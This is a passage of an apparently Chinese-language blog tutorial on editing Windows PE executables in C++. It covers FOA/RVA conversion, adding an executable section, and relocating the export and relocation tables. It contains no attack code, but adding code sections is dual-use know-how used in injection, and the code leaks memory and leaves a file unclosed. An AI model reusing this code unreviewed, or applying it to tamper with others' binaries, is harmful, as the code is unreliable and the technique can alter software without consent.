class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FOAtoRVA</span><span class="params">(<span class="keyword">int</span> FOA,<span class="keyword">char</span>* FileBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//定义</span></span><br><span class="line">    <span class="keyword">int</span> RVA=FOA;</span><br><span class="line">    <span class="keyword">int</span> e_lfanew = *(<span class="keyword">int</span>*)(FileBuffer+<span class="number">60</span>);</span><br><span class="line">    <span class="keyword">short</span> NumberOfSections = *(<span class="keyword">short</span>*)(FileBuffer+e_lfanew+<span class="number">6</span>);</span><br><span class="line">    <span class="keyword">short</span> SizeOfOptionalHeader = *(<span class="keyword">short</span>*)(FileBuffer+e_lfanew+<span class="number">20</span>);</span><br><span class="line">    <span class="keyword">int</span> SectionAlignment = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">56</span>);</span><br><span class="line">    <span class="keyword">int</span> FileAlignment = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">60</span>);</span><br><span class="line">    <span class="keyword">int</span> SizeOfHeaders = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">84</span>);</span><br><span class="line"><span class="comment">//如果PE文件的内存对齐和文件对齐相等，则FOA=RVA</span></span><br><span class="line">    <span class="keyword">if</span> (SectionAlignment==FileAlignment)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> RVA;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//如果FOA在PE头，则FOA=RVA</span></span><br><span class="line">    <span class="keyword">if</span> (FOA&lt;=SizeOfHeaders)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> RVA;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断节</span></span><br><span class="line">    <span class="keyword">int</span> SectionTable = e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader;</span><br><span class="line">    <span class="keyword">int</span> VirtualAddress=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> PointerToRawData1=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> PointerToRawData2=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;NumberOfSections<span class="number">-1</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        VirtualAddress=*(<span class="keyword">int</span>*)(FileBuffer+SectionTable+<span class="number">12</span>+i*<span class="number">40</span>);</span><br><span class="line">        PointerToRawData1=*(<span class="keyword">int</span>*)(FileBuffer+SectionTable+<span class="number">20</span>+i*<span class="number">40</span>);</span><br><span class="line">        PointerToRawData2=*(<span class="keyword">int</span>*)(FileBuffer+SectionTable+<span class="number">20</span>+(i+<span class="number">1</span>)*<span class="number">40</span>);</span><br><span class="line">        <span class="keyword">if</span>(FOA&gt;=PointerToRawData1&amp;&amp;FOA&lt;PointerToRawData2)</span><br><span class="line">        &#123;</span><br><span class="line">            RVA=FOA+VirtualAddress-PointerToRawData1;</span><br><span class="line">            <span class="keyword">return</span> RVA;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    VirtualAddress=*(<span class="keyword">int</span>*)(FileBuffer+SectionTable+<span class="number">12</span>+(NumberOfSections<span class="number">-1</span>)*<span class="number">40</span>);</span><br><span class="line">    PointerToRawData1=*(<span class="keyword">int</span>*)(FileBuffer+SectionTable+<span class="number">20</span>+(NumberOfSections<span class="number">-1</span>)*<span class="number">40</span>);</span><br><span class="line">    RVA=FOA+VirtualAddress-PointerToRawData1;</span><br><span class="line">    <span class="keyword">return</span> RVA;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//和RVA转换FOA思路基本一样，就不做标注</span></span><br></pre></td></tr></table></figure><br><h1 id="0x03-获取文件长度"><a href="#0x03-获取文件长度" class="headerlink" title="0x03 获取文件长度"></a>0x03 获取文件长度</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getlen</span><span class="params">(FILE* fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fseek</span>(fp,<span class="number">0</span>,SEEK_END);</span><br><span class="line">    <span class="keyword">int</span> size = <span class="built_in">ftell</span>(fp);</span><br><span class="line">    <span class="built_in">fseek</span>(fp,<span class="number">0</span>,SEEK_SET);</span><br><span class="line">    <span class="keyword">return</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h1 id="0x04-添加新节"><a href="#0x04-添加新节" class="headerlink" title="0x04 添加新节"></a>0x04 添加新节</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getlen</span><span class="params">(FILE* fp)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//打开文件</span></span><br><span class="line">FILE* fp = <span class="built_in">fopen</span>(<span class="string">&quot;D:/code/text/ll.exe&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    FILE* fp_w = <span class="built_in">fopen</span>(<span class="string">&quot;D:/code/text/a.exe&quot;</span>,<span class="string">&quot;wb&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (fp==<span class="literal">NULL</span> || fp_w==<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Error to open file!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> size = <span class="built_in">getlen</span>(fp);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//分配空间（源文件）</span></span><br><span class="line">    <span class="keyword">char</span>* FileBuffer = <span class="literal">NULL</span>;</span><br><span class="line">FileBuffer = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="built_in">fread</span>(FileBuffer,<span class="number">1</span>,size,fp);</span><br><span class="line"><span class="keyword">if</span> (FileBuffer==<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Error to read file!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义</span></span><br><span class="line"><span class="keyword">int</span> e_lfanew = *(<span class="keyword">int</span>*)(FileBuffer+<span class="number">60</span>);</span><br><span class="line">    <span class="keyword">short</span> NumberOfSections = *(<span class="keyword">short</span>*)(FileBuffer+e_lfanew+<span class="number">6</span>);</span><br><span class="line">    <span class="keyword">short</span> SizeOfOptionalHeader = *(<span class="keyword">short</span>*)(FileBuffer+e_lfanew+<span class="number">20</span>);</span><br><span class="line">    <span class="keyword">int</span> SectionAlignment = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">56</span>);</span><br><span class="line">    <span class="keyword">int</span> SizeOfHeaders = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">84</span>);</span><br><span class="line">    <span class="keyword">int</span> add_section_space = SizeOfHeaders-(e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader+NumberOfSections*<span class="number">40</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断是否有足够的空间来新建表</span></span><br><span class="line">    <span class="keyword">if</span>(add_section_space&lt;<span class="number">80</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Not enough memory space!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//分配空间（添加节之后的文件）</span></span><br><span class="line">    FileBuffer = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(size+SectionAlignment);</span><br><span class="line">    <span class="built_in">memset</span>(FileBuffer,<span class="number">0</span>,size+SectionAlignment);</span><br><span class="line">    <span class="built_in">fseek</span>(fp, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">    <span class="built_in">fread</span>(FileBuffer,<span class="number">1</span>,size,fp);</span><br><span class="line"><span class="keyword">if</span> (FileBuffer==<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Error to read file2!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//新增节表</span></span><br><span class="line">*(<span class="keyword">short</span>*)(FileBuffer+e_lfanew+<span class="number">6</span>) = NumberOfSections+<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>((FileBuffer+e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader+NumberOfSections*<span class="number">40</span>),(FileBuffer+e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader),<span class="number">40</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">char</span> Name[<span class="number">8</span>]=</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x2E</span>,<span class="number">0x63</span>,<span class="number">0x63</span>,<span class="number">0x63</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> x=<span class="number">0</span>; x&lt;<span class="number">8</span>; x++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">char</span>*)(FileBuffer+e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader+NumberOfSections*<span class="number">40</span>+x)=Name[x];</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> VirtualSize = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader+(NumberOfSections<span class="number">-1</span>)*<span class="number">40</span>+<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">int</span> VirtualAddress = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader+(NumberOfSections<span class="number">-1</span>)*<span class="number">40</span>+<span class="number">12</span>);</span><br><span class="line">    <span class="keyword">int</span> SizeOfRawData = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader+(NumberOfSections<span class="number">-1</span>)*<span class="number">40</span>+<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">int</span> PointerToRawData = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader+(NumberOfSections<span class="number">-1</span>)*<span class="number">40</span>+<span class="number">20</span>);</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader+NumberOfSections*<span class="number">40</span>+<span class="number">8</span>) = SectionAlignment;</span><br><span class="line">    *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader+NumberOfSections*<span class="number">40</span>+<span class="number">12</span>) = VirtualAddress+VirtualSize;</span><br><span class="line">    *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader+NumberOfSections*<span class="number">40</span>+<span class="number">16</span>) = SectionAlignment;</span><br><span class="line">    *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader+NumberOfSections*<span class="number">40</span>+<span class="number">20</span>) = PointerToRawData+SizeOfRawData;</span><br><span class="line">    *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">24</span>+SizeOfOptionalHeader+NumberOfSections*<span class="number">40</span>+<span class="number">24</span>) = <span class="number">0x20000060</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改SizeOfImage</span></span><br><span class="line">    <span class="keyword">int</span> SizeOfImage = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">80</span>);</span><br><span class="line">    *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">80</span>) = SizeOfImage+SectionAlignment;</span><br><span class="line"></span><br><span class="line"><span class="comment">//写入文件</span></span><br><span class="line">    <span class="built_in">fwrite</span>(FileBuffer,<span class="number">1</span>,size+SectionAlignment,fp_w);</span><br><span class="line"></span><br><span class="line"><span class="comment">//释放内存</span></span><br><span class="line">    <span class="built_in">free</span>(FileBuffer);</span><br><span class="line">    <span class="built_in">fclose</span>(fp);</span><br><span class="line">    <span class="built_in">fclose</span>(fp_w);</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回新节的FOA</span></span><br><span class="line">    <span class="keyword">return</span> PointerToRawData+SizeOfRawData;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h1 id="0x05-扩大节"><a href="#0x05-扩大节" class="headerlink" title="0x05 扩大节"></a>0x05 扩大节</h1><br><h1 id="0x06-合并节"><a href="#0x06-合并节" class="headerlink" title="0x06 合并节"></a>0x06 合并节</h1><br><h1 id="0x07-移动导出表"><a href="#0x07-移动导出表" class="headerlink" title="0x07 移动导出表"></a>0x07 移动导出表</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">RVAtoFOA</span><span class="params">(<span class="keyword">int</span> RVA,<span class="keyword">char</span>* FileBuffer)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FOAtoRVA</span><span class="params">(<span class="keyword">int</span> FOA,<span class="keyword">char</span>* FileBuffer)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getlen</span><span class="params">(FILE* fp)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">movIET</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> section_FOA = <span class="built_in">add</span>();</span><br><span class="line">    FILE* fp = <span class="built_in">fopen</span>(<span class="string">&quot;D:/code/text/c.exe&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    FILE* fp2 = <span class="built_in">fopen</span>(<span class="string">&quot;D:/code/text/h.exe&quot;</span>,<span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp==<span class="literal">NULL</span>||fp2==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error to open file!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span>* FileBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> size = <span class="built_in">getlen</span>(fp);</span><br><span class="line">    FileBuffer = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">fread</span>(FileBuffer,<span class="number">1</span>,size,fp);</span><br><span class="line"><span class="keyword">if</span> (FileBuffer==<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Error to read file!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//定义</span></span><br><span class="line">    <span class="keyword">int</span> e_lfanew = *(<span class="keyword">int</span>*)(FileBuffer+<span class="number">60</span>);</span><br><span class="line">    <span class="keyword">int</span> IET_VirtualAddress=*(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">120</span>);</span><br><span class="line">    <span class="keyword">int</span> IET_FOA=<span class="built_in">RVAtoFOA</span>(IET_VirtualAddress,FileBuffer);</span><br><span class="line">    <span class="keyword">int</span> NumberOfFunctions=*(<span class="keyword">int</span>*)(FileBuffer+IET_FOA+<span class="number">20</span>);</span><br><span class="line">    <span class="keyword">int</span> AddressOfFunctions=*(<span class="keyword">int</span>*)(FileBuffer+IET_FOA+<span class="number">28</span>);</span><br><span class="line">    <span class="keyword">int</span> AddressOfNameOrdinals = *(<span class="keyword">int</span>*)(FileBuffer+IET_FOA+<span class="number">36</span>);</span><br><span class="line">    <span class="keyword">int</span> NumberOfNames = *(<span class="keyword">int</span>*)(FileBuffer+IET_FOA+<span class="number">24</span>);</span><br><span class="line">    <span class="keyword">int</span> AddressOfNames = *(<span class="keyword">int</span>*)(FileBuffer+IET_FOA+<span class="number">32</span>);</span><br><span class="line">    <span class="keyword">int</span> AddressOfFunctions_FOA=<span class="built_in">RVAtoFOA</span>(AddressOfFunctions,FileBuffer);</span><br><span class="line">    <span class="keyword">int</span> AddressOfNameOrdinals_FOA=<span class="built_in">RVAtoFOA</span>(AddressOfNameOrdinals,FileBuffer);</span><br><span class="line">    <span class="keyword">int</span> AddressOfNames_FOA = <span class="built_in">RVAtoFOA</span>(AddressOfNames,FileBuffer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> full_add = NumberOfFunctions*<span class="number">4</span>;</span><br><span class="line">    <span class="comment">//复制AddressOfFunctions</span></span><br><span class="line">    <span class="built_in">memcpy</span>((FileBuffer+section_FOA),(FileBuffer+AddressOfFunctions_FOA),full_add);</span><br><span class="line">    <span class="keyword">int</span> AddressOfFunctions_FOA_new=section_FOA;</span><br><span class="line">    <span class="comment">//复制AddressOfNameOrdinals</span></span><br><span class="line">    <span class="built_in">memcpy</span>((FileBuffer+section_FOA+full_add),(FileBuffer+AddressOfNameOrdinals_FOA),NumberOfNames*<span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> AddressOfNameOrdinals_FOA_new=section_FOA+full_add;</span><br><span class="line">    full_add+=NumberOfNames*<span class="number">2</span>;</span><br><span class="line">    <span class="comment">//复制AddressOfNames</span></span><br><span class="line">    <span class="built_in">memcpy</span>((FileBuffer+section_FOA+full_add),(FileBuffer+AddressOfNames_FOA), NumberOfFunctions*<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">int</span> AddressOfNames_FOA_new=section_FOA+full_add;</span><br><span class="line">    <span class="keyword">int</span> full_add2=section_FOA+full_add+NumberOfFunctions*<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">int</span> strsize = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//复制AddressOfNames里的名字,修复AddressOfNames</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;NumberOfNames;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> Names_RVA=*(<span class="keyword">int</span>*)(FileBuffer+AddressOfNames_FOA+i*<span class="number">4</span>);</span><br><span class="line">        <span class="keyword">int</span> Names_FOA = <span class="built_in">RVAtoFOA</span>(Names_RVA,FileBuffer);</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">int</span>*)(FileBuffer+section_FOA+full_add+i*<span class="number">4</span>)=<span class="built_in">FOAtoRVA</span>(full_add2,FileBuffer);</span><br><span class="line">        strsize = <span class="built_in">strlen</span>((<span class="keyword">char</span>*)(FileBuffer+Names_FOA));</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="keyword">char</span>*)(FileBuffer+full_add2),(<span class="keyword">char</span>*)(FileBuffer+Names_FOA),strsize+<span class="number">1</span>);</span><br><span class="line">        full_add2+=(strsize+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//复制IMAGE_EXPORT_DIRECTORY结构</span></span><br><span class="line">    <span class="built_in">memcpy</span>((FileBuffer+full_add2),(FileBuffer+IET_FOA),<span class="number">40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//修复IMAGE_EXPORT_DIRECTORY结构</span></span><br><span class="line">    *(<span class="keyword">int</span>*)(FileBuffer+full_add2+<span class="number">28</span>)=<span class="built_in">FOAtoRVA</span>(AddressOfFunctions_FOA_new,FileBuffer);</span><br><span class="line">    *(<span class="keyword">int</span>*)(FileBuffer+full_add2+<span class="number">32</span>)=<span class="built_in">FOAtoRVA</span>(AddressOfNames_FOA_new,FileBuffer);</span><br><span class="line">    *(<span class="keyword">int</span>*)(FileBuffer+full_add2+<span class="number">36</span>)=<span class="built_in">FOAtoRVA</span>(AddressOfNameOrdinals_FOA_new,FileBuffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//修复目录项中的值，指向新的IMAGE_EXPORT_DIRECTORY</span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">120</span>) = <span class="built_in">FOAtoRVA</span>(full_add2,FileBuffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//写入文件</span></span><br><span class="line">    <span class="built_in">fwrite</span>(FileBuffer,<span class="number">1</span>,size,fp2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(FileBuffer);</span><br><span class="line">    <span class="built_in">fclose</span>(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x08-移动重定位表"><a href="#0x08-移动重定位表" class="headerlink" title="0x08 移动重定位表"></a>0x08 移动重定位表</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">movIBR</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> section_FOA=<span class="built_in">add</span>();</span><br><span class="line">FILE* fp = <span class="built_in">fopen</span>(<span class="string">&quot;D:/code/text/c.exe&quot;</span>,<span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    FILE* fp_w = <span class="built_in">fopen</span>(<span class="string">&quot;D:/code/text/d.exe&quot;</span>,<span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp==<span class="literal">NULL</span>||fp_w==<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Error to open file!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span>* FileBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> size = <span class="built_in">getlen</span>(fp);</span><br><span class="line">FileBuffer = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="built_in">fread</span>(FileBuffer,<span class="number">1</span>,size,fp);</span><br><span class="line"><span class="keyword">if</span> (FileBuffer==<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Error to read file!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义</span></span><br><span class="line">    <span class="keyword">int</span> e_lfanew = *(<span class="keyword">int</span>*)(FileBuffer+<span class="number">60</span>);</span><br><span class="line">    <span class="keyword">short</span> NumberOfSections = *(<span class="keyword">short</span>*)(FileBuffer+e_lfanew+<span class="number">6</span>);</span><br><span class="line">    <span class="keyword">int</span> RELOCATION_VirtualAddress = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">120</span>+<span class="number">40</span>);</span><br><span class="line">    <span class="keyword">int</span> RELOCATION_Size = *(<span class="keyword">int</span>*)(FileBuffer+e_lfanew+<span class="number">120</span>+<span class="number">44</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> RELOCATION_FOA = <span class="built_in">RVAtoFOA</span>(RELOCATION_VirtualAddress,FileBuffer);</span><br><span class="line">    </span><br><span class="line"><span class="comment">//移动</span></span><br><span class="line">    <span class="built_in">memcpy</span>(FileBuffer+section_FOA,FileBuffer+RELOCATION_FOA,RELOCATION_Size+<span class="number">8</span>);</span><br><span 